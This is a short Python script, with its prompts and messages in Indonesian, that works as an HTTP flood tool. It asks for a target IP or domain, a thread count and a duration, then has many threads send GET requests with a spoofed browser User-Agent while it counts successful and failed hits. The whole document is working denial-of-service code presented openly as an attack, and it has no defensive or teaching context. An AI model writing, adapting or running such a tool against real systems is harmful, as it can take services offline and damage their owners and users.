import time, threading, random, socket, urllib.request

target = input("Masukkan IP/domain : ")
if not target.startswith("http"):
    target = "http://" + target
threads = int(input("Thread : ") or 50)
durasi = int(input("Durasi (detik) : ") or 30)

try:
    domain = target.split("//")[1].split("/")[0].split(":")[0]
    ip = socket.gethostbyname(domain)
    print("[+] IP:", ip)
except:
    ip = "tidak diketahui"

total = 0
sukses = 0
gagal = 0
running = True

def serang():
    global total, sukses, gagal
    while running:
        try:
            time.sleep(random.uniform(0.01, 0.12))
            req = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=3) as resp:
                total += 1
                if resp.status < 400:
                    sukses += 1
                else:
                    gagal += 1
        except:
            total += 1
            gagal += 1

print(f"\nMenyerang {target} dengan {threads} thread...")
for _ in range(threads):
    threading.Thread(target=serang, daemon=True).start()

mulai = time.time()
while running:
    time.sleep(1)
    if time.time() - mulai > durasi:
        running = False
        break
    print(f"\r⏱ {int(time.time()-mulai)}s | ✓ {sukses} | ✗ {gagal} | ∑ {total}", end="")

print("\n\nSelesai!")
